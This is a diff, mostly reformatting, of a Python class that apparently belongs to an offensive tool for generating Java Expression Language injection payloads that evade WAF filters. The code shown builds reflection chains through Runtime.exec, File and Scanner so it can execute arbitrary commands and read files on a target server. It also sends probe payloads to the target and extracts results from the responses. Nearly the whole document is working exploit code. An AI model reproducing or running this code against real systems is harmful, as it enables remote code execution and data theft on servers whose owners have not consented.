@@ -29,16 +29,14 @@ class GenPayload:
             self.initialize()
 
     def offlineInit(self):
-        initData = utils.jsonFromFile("datas/inits.json")
+        initData = utils.jsonFromFile("src/datas/inits.json")
         for key, value in initData.items():
             setattr(self, key, value)
 
     def chooseNumMethod(self):
         if utils.checkNoDigits(self.waf):
             return "genNumNatural"
-        if all(
-            element not in ["[", "]", "[]", ".", "size", "()"] for element in self.waf
-        ):
+        if all(element not in ["[", "]", "[]", ".", "size", "()"] for element in self.waf):
             return "genNumArraySize"
         if all(
             element
@@ -71,14 +69,9 @@ class GenPayload:
         # String Class
         if all(element not in ['"', "getClass", "()"] for element in self.waf):
             self.STRING_CLASS = '"".getClass()'
-        elif all(
-            element not in ["[", "]", "[]", "getClass", "toString", "()"]
-            for element in self.waf
-        ):
+        elif all(element not in ["[", "]", "[]", "getClass", "toString", "()"] for element in self.waf):
             self.STRING_CLASS = "[].getClass().toString().getClass()"
-        if all(
-            element not in ["[", "]", "[]", "getClass", "()"] for element in self.waf
-        ):
+        if all(element not in ["[", "]", "[]", "getClass", "()"] for element in self.waf):
             self.ARRAY_CLASS = "[].getClass()"
 
         if self.GEN_NUM_METHOD == "":
@@ -113,9 +106,7 @@ class GenPayload:
         self.FORNAME["Runtime"] = self.genClassForname("java.lang.Runtime")
         self.FORNAME["File"] = self.genClassForname("java.io.File")
         self.FORNAME["Scanner"] = self.genClassForname("java.util.Scanner")
-        self.FORNAME["InputStreamReader"] = self.genClassForname(
-            "java.io.InputStreamReader"
-        )
+        self.FORNAME["InputStreamReader"] = self.genClassForname("java.io.InputStreamReader")
         self.FORNAME["BufferedReader"] = self.genClassForname("java.io.BufferedReader")
 
     def initMethodsIndex(self):
@@ -285,22 +276,16 @@ class GenPayload:
                 randomPrefix = utils.randomString(length=10)
                 randomSubfix = utils.randomString(length=10)
                 payload = f"{randomPrefix}{payload}{randomSubfix}"
-                result = utils.getDataFromResponse(
-                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
-                )
+                result = utils.getDataFromResponse(self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix)
                 self.enrichSubstringTable("stringFields", i, result)
 
             # String methods
             for i in range(80):
-                payload = (
-                    f"{self.genEL(self.getMethodIndexFromClass(self.STRING_CLASS, i))}"
-                )
+                payload = f"{self.genEL(self.getMethodIndexFromClass(self.STRING_CLASS, i))}"
                 randomPrefix = utils.randomString(length=10)
                 randomSubfix = utils.randomString(length=10)
                 payload = f"{randomPrefix}{payload}{randomSubfix}"
-                result = utils.getDataFromResponse(
-                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
-                )
+                result = utils.getDataFromResponse(self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix)
                 self.enrichSubstringTable("stringMethods", i, result)
         if self.ARRAY_CLASS != "":
             # String fields
@@ -309,22 +294,16 @@ class GenPayload:
                 randomPrefix = utils.randomString(length=10)
                 randomSubfix = utils.randomString(length=10)
                 payload = f"{randomPrefix}{payload}{randomSubfix}"
-                result = utils.getDataFromResponse(
-                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
-                )
+                result = utils.getDataFromResponse(self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix)
                 self.enrichSubstringTable("arrayFields", i, result)
 
             # String methods
             for i in range(80):
-                payload = (
-                    f"{self.genEL(self.getMethodIndexFromClass(self.ARRAY_CLASS, i))}"
-                )
+                payload = f"{self.genEL(self.getMethodIndexFromClass(self.ARRAY_CLASS, i))}"
                 randomPrefix = utils.randomString(length=10)
                 randomSubfix = utils.randomString(length=10)
                 payload = f"{randomPrefix}{payload}{randomSubfix}"
-                result = utils.getDataFromResponse(
-                    self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix
-                )
+                result = utils.getDataFromResponse(self.reqHandler.sendPayload(payload), randomPrefix, randomSubfix)
                 self.enrichSubstringTable("arrayMethods", i, result)
 
     def genSubstring(self, object, indexStart, indexEnd):
@@ -364,9 +343,7 @@ class GenPayload:
         return currentStr
 
     def genClassForname(self, className):
-        forname = self.getMethodIndexFromClass(
-            self.CLASS_CLASS, self.METHODS_INDEX["forName"]
-        )
+        forname = self.getMethodIndexFromClass(self.CLASS_CLASS, self.METHODS_INDEX["forName"])
         class_str = self.genString(className)
         return f"{forname}.invoke(null, {class_str})"
 
@@ -434,9 +411,7 @@ class GenPayload:
         return response, result
 
     def execPayloadNoOutput(self, command):
-        getRuntimeMethod = self.getMethodIndexFromClass(
-            self.FORNAME["Runtime"], self.METHODS_INDEX["getRuntime"]
-        )
+        getRuntimeMethod = self.getMethodIndexFromClass(self.FORNAME["Runtime"], self.METHODS_INDEX["getRuntime"])
         getRuntime = self.genInvokeMethod(getRuntimeMethod, "null", [])
         bashPayload = self.genString(command)
         execPayload = getRuntime + ".exec(" + bashPayload + ")"
@@ -453,7 +428,9 @@ class GenPayload:
 
         file = f"{self.FORNAME['File']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['File'])}].newInstance({filenamePayload})"
         scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner@File'])}].newInstance({file})"
-        innerPayload = f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"
+        innerPayload = (
+            f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"
+        )
 
         return innerPayload
 
@@ -470,10 +447,7 @@ class GenPayload:
         return result.replace("\\n", "\n")
 
     def canExec(self):
-        if not all(
-            element not in ["null", "invoke", "getMethods", "get", "Methods", "()"]
-            for element in self.waf
-        ):
+        if not all(element not in ["null", "invoke", "getMethods", "get", "Methods", "()"] for element in self.waf):
             return False
         if not self.FORNAME["Runtime"]:
             return False
@@ -481,10 +455,7 @@ class GenPayload:
         return True
 
     def hasOutput(self):
-        if (
-            not self.FORNAME["Scanner"]
-            or not self.CONSTRUCTOR_INDEX["Scanner@InputStream"]
-        ):
+        if not self.FORNAME["Scanner"] or not self.CONSTRUCTOR_INDEX["Scanner@InputStream"]:
             return False
         if not all(
             element
@@ -521,19 +492,19 @@ class GenPayload:
 
     def genExecPayload(self, command):
         runTime = self.FORNAME["Runtime"]
-        execMethod = (
-            f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['exec'])}]"
-        )
+        execMethod = f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['exec'])}]"
 
-        getRuntimeMethod = (
-            f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['getRuntime'])}]"
-        )
+        getRuntimeMethod = f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['getRuntime'])}]"
 
-        execPayload = f"{execMethod}.invoke({getRuntimeMethod}.invoke(null), {self.genString(command)}).getInputStream()"
+        execPayload = (
+            f"{execMethod}.invoke({getRuntimeMethod}.invoke(null), {self.genString(command)}).getInputStream()"
+        )
 
         scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner@InputStream'])}].newInstance({execPayload})"
 
-        innerPayload = f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"
+        innerPayload = (
+            f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"
+        )
 
         return innerPayload
 
@@ -553,8 +524,4 @@ class GenPayload:
         attributes = vars(self)
         attributes.pop("reqHandler")
         with open("inits.json", "w") as file:
-            file.write(
-                json.dumps(
-                    attributes, indent=4, sort_keys=True, separators=(", ", ": ")
-                )
-            )
+            file.write(json.dumps(attributes, indent=4, sort_keys=True, separators=(", ", ": ")))
